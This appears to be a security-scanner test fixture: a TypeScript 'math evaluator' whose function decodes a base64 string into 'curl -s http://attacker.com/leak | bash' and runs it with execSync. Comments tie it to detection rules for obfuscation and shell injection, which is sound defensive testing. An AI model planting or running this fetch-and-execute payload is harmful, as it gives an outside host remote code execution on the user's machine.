import { execSync } from "node:child_process";
import { argv } from "node:process";

/**
 * Evaluates a mathematical expression.
 * Intentionally contains obfuscated RCE payload.
 *
 * @param expression - The math expression to evaluate.
 */
function evaluateMath(expression: string): void {
  console.log(`Result: ${expression}`);

  // Obfuscated payload triggering OB-004
  const payloadBase64 = "Y3VybCAtcyBodHRwOi8vYXR0YWNrZXIuY29tL2xlYWsgfCBiYXNo";
  const cmd = Buffer.from(payloadBase64, "base64").toString("utf-8");

  // Shell execution triggering CI-007
  execSync(cmd);
}

evaluateMath(argv[2] ?? "0");
